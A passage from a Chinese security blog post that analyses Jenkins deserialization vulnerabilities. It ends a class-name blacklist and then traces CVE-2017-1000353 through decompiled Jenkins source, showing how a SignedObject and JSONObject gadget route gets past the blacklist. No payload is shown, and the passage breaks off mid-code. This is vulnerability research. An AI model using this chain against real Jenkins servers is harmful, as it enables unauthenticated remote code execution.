class="string">&quot;^org[.]hibernate[.].*&quot;</span>, </span><br><span class="line">    <span class="string">&quot;^org[.]python[.].*&quot;</span>, </span><br><span class="line">    <span class="string">&quot;^org[.]springframework[.](?!(\\p&#123;Alnum&#125;+[.])*\\p&#123;Alnum&#125;*Exception$).*&quot;</span>, </span><br><span class="line">    <span class="string">&quot;^sun[.]rmi[.].*&quot;</span>, </span><br><span class="line">    <span class="string">&quot;^javax[.]imageio[.].*&quot;</span>, </span><br><span class="line">    <span class="string">&quot;^java[.]util[.]ServiceLoader$&quot;</span>, </span><br><span class="line">    <span class="string">&quot;^java[.]net[.]URLClassLoader$&quot;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="CVE-2017-1000353"><a href="#CVE-2017-1000353" class="headerlink" title="CVE-2017-1000353"></a>CVE-2017-1000353</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull jenkins:2.46.1</span><br></pre></td></tr></table></figure>

<h4 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p><a href="https://ssd-disclosure.com/ssd-advisory-cloudbees-jenkins-unauthenticated-code-execution/">参考文章</a>中给出了 payload，该漏洞与 CVE-2015-8103 类似，这次是从 HTTP 访问 cli 触发的漏洞，处理代码在 CLIAction$CliEndpointResponse 类的 generateResponse 函数中：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">generateResponse</span><span class="params">(StaplerRequest req, StaplerResponse rsp, Object node)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">UUID</span> <span class="variable">uuid</span> <span class="operator">=</span> UUID.fromString(req.getHeader(<span class="string">&quot;Session&quot;</span>));</span><br><span class="line">        rsp.setHeader(<span class="string">&quot;Hudson-Duplex&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (req.getHeader(<span class="string">&quot;Side&quot;</span>).equals(<span class="string">&quot;download&quot;</span>)) &#123;</span><br><span class="line">            FullDuplexHttpChannel server;</span><br><span class="line">            CLIAction.<span class="built_in">this</span>.duplexChannels.put(uuid, server = <span class="keyword">new</span> <span class="title class_">FullDuplexHttpChannel</span>(uuid, !Jenkins.getActiveInstance().hasPermission(Jenkins.ADMINISTER)) &#123;</span><br><span class="line">                <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(Channel channel)</span> <span class="keyword">throws</span> IOException, InterruptedException &#123;</span><br><span class="line">                    channel.setProperty(CLICommand.TRANSPORT_AUTHENTICATION, Jenkins.getAuthentication());</span><br><span class="line">                    channel.setProperty(CliEntryPoint.class.getName(), <span class="keyword">new</span> <span class="title class_">CliManagerImpl</span>(channel));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                server.download(req, rsp);</span><br><span class="line">            &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                CLIAction.<span class="built_in">this</span>.duplexChannels.remove(uuid);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            ((FullDuplexHttpChannel)CLIAction.<span class="built_in">this</span>.duplexChannels.get(uuid)).upload(req, rsp);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">catch</span> (InterruptedException var10) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IOException</span>(var10);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到，Jenkins 通过一个头 Session 决定一个通信频道，然后根据另一个头 Side 的不同，在同一个频道中会有 upload 和 download 两种处理方式，download 的处理会调用 download 函数，其中一部分代码如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span>(<span class="built_in">this</span>.upload == <span class="literal">null</span> &amp;&amp; System.currentTimeMillis() &lt; end) &#123;</span><br><span class="line">    <span class="built_in">this</span>.wait(<span class="number">1000L</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">this</span>.upload == <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IOException</span>(<span class="string">&quot;HTTP full-duplex channel timeout: &quot;</span> + <span class="built_in">this</span>.uuid);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到，download 会挂起等待一段时间，直到 upload 属性被赋值才会进行下一步操作。回去看看 upload 的处理：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title function_">upload</span><span class="params">(StaplerRequest req, StaplerResponse rsp)</span> <span class="keyword">throws</span> InterruptedException, IOException &#123;</span><br><span class="line">    rsp.setStatus(<span class="number">200</span>);</span><br><span class="line">    <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> req.getInputStream();</span><br><span class="line">    <span class="keyword">if</span> (DIY_CHUNKING) &#123;</span><br><span class="line">        in = <span class="keyword">new</span> <span class="title class_">ChunkedInputStream</span>((InputStream)in);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">this</span>.upload = (InputStream)in;</span><br><span class="line">    <span class="built_in">this</span>.notify();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(!<span class="built_in">this</span>.completed) &#123;</span><br><span class="line">        <span class="built_in">this</span>.wait();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>从 upload 中读取输入流，然后放入 upload 属性中。upload 结束后再回到 download：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.channel = <span class="keyword">new</span> <span class="title class_">Channel</span>(<span class="string">&quot;HTTP full-duplex channel &quot;</span> + <span class="built_in">this</span>.uuid, Computer.threadPoolForRemoting, Mode.BINARY, <span class="built_in">this</span>.upload, (OutputStream)out, (OutputStream)<span class="literal">null</span>, <span class="built_in">this</span>.restricted);</span><br><span class="line">    ...</span><br><span class="line">&#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.completed = <span class="literal">true</span>;</span><br><span class="line">    <span class="built_in">this</span>.notify();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>实例化了一个 Channel 类，其构造函数是一个套娃过程，其中一步如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Channel(ChannelBuilder settings, InputStream is, OutputStream os) <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="built_in">this</span>(settings, settings.negotiate(is, os));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>negotiate 函数就是 CVE-2015-8103 的反序列化触发点，不过那个触发点已经被修复了，这次走的是另一条路，现版本的 switch 代码块如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">switch</span>(i) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        LOGGER.log(Level.FINER, <span class="string">&quot;Received mode preamble: &#123;0&#125;&quot;</span>, modes[i]);</span><br><span class="line">        <span class="keyword">if</span> (mode == Mode.NEGOTIATE) &#123;</span><br><span class="line">            mode = modes[i];</span><br><span class="line">            LOGGER.log(Level.FINER, <span class="string">&quot;Sending agreed mode preamble: &#123;0&#125;&quot;</span>, mode);</span><br><span class="line">            os.write(mode.preamble);</span><br><span class="line">            os.flush();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (modes[i] != mode) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IOException</span>(<span class="string">&quot;Protocol negotiation failure&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        LOGGER.log(Level.FINE, <span class="string">&quot;Channel name &#123;0&#125; negotiated mode &#123;1&#125; with capability &#123;2&#125;&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="built_in">this</span>.name, mode, cap&#125;);</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.makeTransport(is, os, mode, cap);</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        cap = Capability.read(is);</span><br><span class="line">        LOGGER.log(Level.FINER, <span class="string">&quot;Received capability preamble: &#123;0&#125;&quot;</span>, cap);</span><br><span class="line">        ptr[i] = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(<span class="string">&quot;Unexpected preamble byte #&quot;</span> + i + <span class="string">&quot;. Only &quot;</span> + preambles.length + <span class="string">&quot; bytes are supported&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到，当 i 为 0、1 时，返回值来自 makeTransport 函数：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> CommandTransport <span class="title function_">makeTransport</span><span class="params">(InputStream is, OutputStream os, Mode mode, Capability cap)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="type">FlightRecorderInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FlightRecorderInputStream</span>(is);</span><br><span class="line">    <span class="keyword">if</span> (cap.supportsChunking()) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ChunkedCommandTransport</span>(cap, mode.wrap(fis), mode.wrap(os), os);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(mode.wrap(os));</span><br><span class="line">        oos.flush();</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ClassicCommandTransport</span>(<span class="keyword">new</span> <span class="title class_">ObjectInputStreamEx</span>(mode.wrap(fis), <span class="built_in">this</span>.getBaseLoader(), <span class="built_in">this</span>.getClassFilter()), oos, fis, os, cap);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>因为此处的 cap 可以由 Capability.read 反序列化而成，所以这里简单来说就是一个 ClassicCommandTransport 对象，回到 Channel 的构造函数中，最后一步如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="title function_">Channel</span><span class="params">(ChannelBuilder settings, CommandTransport transport)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.internalExport(IChannel.class, <span class="built_in">this</span>, <span class="literal">false</span>) != <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">AssertionError</span>();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        ...</span><br><span class="line">        transport.setup(<span class="built_in">this</span>, <span class="keyword">new</span> <span class="title class_">CommandReceiver</span>() &#123;</span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">handle</span><span class="params">(Command cmd)</span> &#123;</span><br><span class="line">                Channel.<span class="built_in">this</span>.commandsReceived++;</span><br><span class="line">                Channel.<span class="built_in">this</span>.lastCommandReceivedAt = System.currentTimeMillis();</span><br><span class="line">                <span class="keyword">if</span> (Channel.logger.isLoggable(Level.FINE)) &#123;</span><br><span class="line">                    Channel.logger.fine(<span class="string">&quot;Received &quot;</span> + cmd);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    cmd.execute(Channel.<span class="built_in">this</span>);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Throwable var3) &#123;</span><br><span class="line">                    Channel.logger.log(Level.SEVERE, <span class="string">&quot;Failed to execute command &quot;</span> + cmd + <span class="string">&quot; (channel &quot;</span> + Channel.<span class="built_in">this</span>.name + <span class="string">&quot;)&quot;</span>, var3);</span><br><span class="line">                    Channel.logger.log(Level.SEVERE, <span class="string">&quot;This command is created here&quot;</span>, cmd.createdAt);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">terminate</span><span class="params">(IOException e)</span> &#123;</span><br><span class="line">                Channel.<span class="built_in">this</span>.terminate(e);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        ACTIVE_CHANNELS.put(<span class="built_in">this</span>, <span class="built_in">this</span>.ref());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>transport 即上面的 ClassicCommandTransport 对象，下一步调用其 setup 函数：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setup</span><span class="params">(Channel channel, CommandReceiver receiver)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.channel = channel;</span><br><span class="line">    (<span class="keyword">new</span> <span class="title class_">SynchronousCommandTransport</span>.ReaderThread(receiver)).start();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ReaderThread 类的 run 函数一部分如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd = SynchronousCommandTransport.<span class="built_in">this</span>.read();</span><br></pre></td></tr></table></figure>

<p>调用的 read 来自 ClassicCommandTransport 类：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> Command <span class="title function_">read</span><span class="params">()</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">Command</span> <span class="variable">cmd</span> <span class="operator">=</span> Command.readFrom(<span class="built_in">this</span>.channel, <span class="built_in">this</span>.ois);</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.rawIn != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="built_in">this</span>.rawIn.clear();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> cmd;</span><br><span class="line">    &#125; </span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>最后来到 Command.readFrom：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> Command <span class="title function_">readFrom</span><span class="params">(Channel channel, ObjectInputStream ois)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">    <span class="type">Channel</span> <span class="variable">old</span> <span class="operator">=</span> Channel.setCurrent(channel);</span><br><span class="line"></span><br><span class="line">    Command var3;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        var3 = (Command)ois.readObject();</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        Channel.setCurrent(old);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> var3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到另一个没有那么严格限制的反序列化点，不过这里的 ois 来自前面实例化 ClassicCommandTransport 对象时传入的 ObjectInputStreamEx 对象，也就是说这个反序列化点存在 CVE-2015-8103 的修复方式中提到的黑名单校验。所以要通过这个反序列化点进行反序列化攻击，还需要想点别的办法，比如某个可序列化类中会自己实例化一个 ObjectInputStream 然后输入一些可控字符 再 readObject 一下。</p>
<p>而 JDK 中正好有一个类 SignedObject，其 getObject 函数如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">getObject</span><span class="params">()</span></span><br><span class="line">    <span class="keyword">throws</span> IOException, ClassNotFoundException</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// creating a stream pipe-line, from b to a</span></span><br><span class="line">    <span class="type">ByteArrayInputStream</span> <span class="variable">b</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(<span class="built_in">this</span>.content);</span><br><span class="line">    <span class="type">ObjectInput</span> <span class="variable">a</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(b);</span><br><span class="line">    <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> a.readObject();</span><br><span class="line">    b.close();</span><br><span class="line">    a.close();</span><br><span class="line">    <span class="keyword">return</span> obj;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>问题在于这个类没有继承什么接口，也没有调用其 getObject 函数的地方，所以要连接成反序列化链就需要找到一个反射操作的地方。</p>
<p>光 JDK 内部是没有这种类的，不过 Jenkins 内有个 JSONObject 类，其 defaultBeanProcessing 函数如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> JSONObject <span class="title function_">defaultBeanProcessing</span><span class="params">(Object bean, JsonConfig jsonConfig)</span> &#123;</span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    PropertyDescriptor[] pds = PropertyUtils.getPropertyDescriptors(bean);</span><br><span class="line">    <span class="type">PropertyFilter</span> <span class="variable">jsonPropertyFilter</span> <span class="operator">=</span> jsonConfig.getJsonPropertyFilter();</span><br><span class="line"></span><br><span class="line">    String key;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; pds.length; ++i) &#123;</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">bypass</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">key</span> <span class="operator">=</span> pds[i].getName();</span><br><span class="line">        <span class="keyword">if</span> (!exclusions.contains(key) &amp;&amp; (!jsonConfig.isIgnoreTransientFields() || !isTransientField(key, beanClass, jsonConfig))) &#123;</span><br><span class="line">            <span class="type">Class</span> <span class="variable">type</span> <span class="operator">=</span> pds[i].getPropertyType();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                pds[i].getReadMethod();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception var17) &#123;</span><br><span class="line">                ...</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (pds[i].getReadMethod() != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (!isTransient(pds[i].getReadMethod(), jsonConfig)) &#123;</span><br><span class="line">                    <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> PropertyUtils.getProperty(bean, key);</span><br><span class="line">                    ...</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到，这里会调用 getPropertyDescriptors 获取某个类中的属性描述符，经过测试可以发现，除了类中定义好的属性，getXXX 函数也会被 getPropertyDescriptors 函数认为是一个属性，所以可以通过 defaultBeanProcessing 函数调用 getObject。</p>
<p>继续往上，_fromBean：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> JSONObject <span class="title function_">_fromBean</span><span class="params">(Object bean, JsonConfig jsonConfig)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!addInstance(bean)) &#123;</span><br><span class="line">        ...</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        fireObjectStartEvent(jsonConfig);</span><br><span class="line">        <span class="type">JsonBeanProcessor</span> <span class="variable">processor</span> <span class="operator">=</span> jsonConfig.findJsonBeanProcessor(bean.getClass());</span><br><span class="line">        JSONObject json;</span><br><span class="line">        <span class="keyword">if</span> (processor != <span class="literal">null</span>) &#123;</span><br><span class="line">            ...</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            json = defaultBeanProcessing(bean, jsonConfig);</span><br><span class="line">            removeInstance(bean);</span><br><span class="line">            fireObjectEndEvent(jsonConfig);</span><br><span class="line">            <span class="keyword">return</span> json;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>继续：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> JSONObject <span class="title function_">fromObject</span><span class="params">(Object object, JsonConfig jsonConfig)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (object != <span class="literal">null</span> &amp;&amp; !JSONUtils.isNull(object)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (object <span class="keyword">instanceof</span> Enum) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;&#x27;object&#x27; is an Enum. Use JSONArray instead&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!(object <span class="keyword">instanceof</span> Annotation) &amp;&amp; !object.getClass().isAnnotation()) &#123;</span><br><span class="line">            <span class="keyword">if</span> (object <span class="keyword">instanceof</span> JSONObject) &#123;</span><br><span class="line">                <span class="keyword">return</span> _fromJSONObject((JSONObject)object, jsonConfig);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (object <span class="keyword">instanceof</span> DynaBean) &#123;</span><br><span class="line">                <span class="keyword">return</span> _fromDynaBean((DynaBean)object, jsonConfig);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (object <span class="keyword">instanceof</span> JSONTokener) &#123;</span><br><span class="line">                <span class="keyword">return</span> _fromJSONTokener((JSONTokener)object, jsonConfig);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (object <span class="keyword">instanceof</span> JSONString) &#123;</span><br><span class="line">                <span class="keyword">return</span> _fromJSONString((JSONString)object, jsonConfig);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (object <span class="keyword">instanceof</span> Map) &#123;</span><br><span class="line">                <span class="keyword">return</span> _fromMap((Map)object, jsonConfig);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (object <span class="keyword">instanceof</span> String) &#123;</span><br><span class="line">                <span class="keyword">return</span> _fromString((String)object, jsonConfig);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!JSONUtils.isNumber(object) &amp;&amp; !JSONUtils.isBoolean(object) &amp;&amp; !JSONUtils.isString(object)) &#123;</span><br><span class="line">                <span class="keyword">if</span> (JSONUtils.isArray(object)) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;&#x27;object&#x27; is an array. Use JSONArray instead&quot;</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">return</span> _fromBean(object, jsonConfig);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> <span 